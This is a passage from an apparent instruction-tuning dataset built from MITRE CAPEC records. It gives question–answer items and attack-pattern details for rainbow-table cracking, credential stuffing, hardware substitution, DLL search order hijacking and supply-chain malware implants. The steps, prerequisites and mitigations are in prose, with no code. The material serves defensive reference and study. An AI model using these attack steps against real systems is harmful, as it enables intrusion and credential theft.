          "xhtml:p": "A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table. Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.",
              "Technique": [
                "Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)",
                "Obtain password hashes from platform-specific storage locations (e.g. Windows registry)",
                "Sniff network packets containing password hashes."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.",
              "Technique": "Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.",
            "Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).",
            "The system uses one factor password based authentication."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place."
          }
        },
        "Resources_Required": {
          "Resource": "Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required."
        },
        "Indicators": {
          "Indicator": "This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": "Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it."
        },
        "Example_Instances": {
          "Example": "BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "261"
            },
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "916"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1110.002",
            "Entry_Name": "Brute Force:Password Cracking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Credential Stuffing (CAPEC ID: 600), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: A user leverages the password \"Password123\" for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.\nIn October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A user leverages the password \"Password123\" for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.",
        "In October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised."
      ],
      "@Name": "Credential Stuffing (CAPEC ID: 600)",
      "attack_ptrn": {
        "@ID": "600",
        "@Name": "Credential Stuffing",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. Credential Stuffing attacks rely upon the fact that many users leverage the same username/password combination for multiple systems, applications, and services."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Attacks of this kind often target management services over commonly used ports such as SSH, FTP, Telnet, LDAP, Kerberos, MySQL, and more. Additional targets include Single Sign-On (SSO) or cloud-based applications/services that utilize federated authentication protocols, and externally facing applications.",
            "The primary goal of Credential Stuffing is to achieve lateral movement and gain authenticated access to additional systems, applications, and/or services. A successfully executed Credential Stuffing attack could result in the adversary impersonating the victim or executing any action that the victim is authorized to perform.",
            "Although not technically a brute force attack, Credential Stuffing attacks can function as such if an adversary possess multiple known passwords for the same user account. This may occur in the event where an adversary obtains user credentials from multiple sources or if the adversary obtains a user's password history for an account.",
            "Credential Stuffing attacks are similar to Password Spraying attacks (CAPEC-565) regarding their targets and their overall goals. However, Password Spraying attacks do not have any insight into known username/password combinations and instead leverage common or expected passwords. This also means that Password Spraying attacks must avoid inducing account lockouts, which is generally not a worry of Credential Stuffing attacks. Password Spraying attacks may additionally lead to Credential Stuffing attacks, once a successful username/password combination is discovered."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "560",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.",
              "Technique": [
                "An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.",
                "An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.",
                "An adversary conducts a sniffing attack to steal credentials as they are transmitted.",
                "An adversary gains access to a database and exfiltrates password hashes.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account)."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Attempt authentication] Try each username/password combination until the target grants access.",
              "Technique": "Manually or automatically enter each username/password combination through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.",
            "The system/application does not have a sound password policy that is being enforced.",
            "The system/application does not implement an effective password throttling mechanism.",
            "The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A Credential Stuffing attack is very straightforward."
          }
        },
        "Resources_Required": {
          "Resource": [
            "A machine with sufficient resources for the job (e.g. CPU, RAM, HD).",
            "A known list of username/password combinations.",
            "A custom script that leverages the credential list to launch the attack."
          ]
        },
        "Indicators": {
          "Indicator": [
            "Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.",
            "The login attempts use passwords that have been used previously by the user account in question.",
            "Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.",
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Ensure users are not reusing username/password combinations for multiple systems, applications, or services.",
            "Do not reuse local administrator account credentials across systems.",
            "Deny remote use of local admin credentials to log into domain systems.",
            "Do not allow accounts to be a local administrator on more than one system.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Monitor system and domain logs for abnormal credential access."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A user leverages the password \"Password123\" for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.",
            "In October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1110.004",
              "Entry_Name": "Brute Force:Credential Stuffing"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Credential stuffing"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-567"
            },
            {
              "@External_Reference_ID": "REF-568"
            },
            {
              "@External_Reference_ID": "REF-569"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Hardware Component Substitution (CAPEC ID: 531)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity.",
      "@Name": "Hardware Component Substitution (CAPEC ID: 531)",
      "attack_ptrn": {
        "@ID": "531",
        "@Name": "Hardware Component Substitution",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "534"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Physical access to the system or the integration facility where hardware components are kept."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts."
          }
        },
        "Example_Instances": {
          "Example": "An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Hardware Component Substitution After Installation"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Search Order Hijacking (CAPEC ID: 471)",
    "context": "",
    "output": "For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.\n- macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.",
        "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level."
      ],
      "@Name": "Search Order Hijacking (CAPEC ID: 471)",
      "attack_ptrn": {
        "@ID": "471",
        "@Name": "Search Order Hijacking",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "159"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.",
              "Technique": [
                "The attacker uses a tool such as the OSX \"otool\" utility or manually probes whether the target application uses dynamically linked libraries.",
                "The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that they will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.",
              "Technique": "The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using \"sleep(2)\" and \"usleep()\" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries they crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.",
              "Technique": [
                "The attacker modifies the entries in the configuration files pointing to the malicious libraries they crafted.",
                "The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-132.",
                "The attacker leverages file search path order issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-38."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Attacker has a mechanism to place its malicious libraries in the needed location on the file system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to create a malicious library."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected",
            "Design: Sign system DLLs so that unauthorized DLLs can be detected."
          ]
        },
        "Example_Instances": {
          "Example": [
            "For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.",
            "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "427"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.001",
              "Entry_Name": "Hijack Execution Flow:DLL search order hijacking"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.004",
              "Entry_Name": "Hijack Execution Flow: Dylib Hijacking"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.008",
              "Entry_Name": "Hijack Execution Flow: Path Interception by Search Order Hijacking"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-409"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "DLL Search Order Hijacking"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Malicious Software Implanted (CAPEC ID: 523)",
    "context": "",
    "output": "Possible examples: An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities.",
      "@Name": "Malicious Software Implanted (CAPEC ID: 523)",
      "attack_ptrn": {
        "@ID": "523",
        "@Name": "Malicious Software Implanted",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "439",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Entry Point] The adversary must first identify a system that they wish to target and search for an entry point they can use to install the malicious software. This could be a system which they have prior knowledge of, giving them insight into the software and environment.",
              "Technique": [
                "Use a JTAGulator to identify exposed JTAG and UART interfaces in smaller embedded systems.",
                "Identify exposed USB connectors that could be used to load software."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.",
              "Technique": [
                "Procure a system and observe the steps it takes in the shipment process.",
                "Identify possible warehouses that systems are stored after manufacturing."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Test Malicious Software] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.",
              "Technique": [
                "Design malicious software that will give an adversary a backdoor into the system once it is deployed to the victim.",
                "Obtain already designed malicious software that just need to be placed into the system."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Implant Software in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary implants the malicious software into the system. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Physical access to the system after it has left the manufacturer but before it is deployed at the victim location."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Advanced knowledge of the design of the system and it's operating system components and subcomponents."
            },
            {
              "@Level": "High",
              "#text": "Malicious software creation."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Deploy strong code integrity policies to allow only authorized apps to run.",
            "Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.",
            "Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.",
            "Require SSL for update channels and implement certificate transparency based verification.",
            "Sign everything, including configuration files, XML files and packages.",
            "Develop an incident response process, disclose supply chain incidents and notify customers with accurate and timely information."
          ]
        },
        "Example_Instances": {
          "Example": "An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-716"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
